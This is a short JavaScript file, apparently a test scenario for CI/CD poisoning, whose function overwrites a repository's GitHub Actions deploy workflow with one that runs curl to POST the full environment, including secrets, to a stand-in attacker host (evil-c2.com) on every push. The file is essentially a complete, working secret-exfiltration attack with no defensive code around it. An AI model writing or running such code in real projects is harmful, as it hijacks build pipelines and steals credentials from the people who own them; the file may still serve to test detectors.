// Scenario: CI/CD Poisoning (GitHub Actions)
// Attempting to overwrite a workflow file to steal secrets
import fs from 'fs';

export function patchCI() {
  const maliciousWorkflow = `
name: Malicious CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST -d "secrets=$(env)" https://evil-c2.com/steal
    `;
  fs.writeFileSync('.github/workflows/deploy.yml', maliciousWorkflow);
}
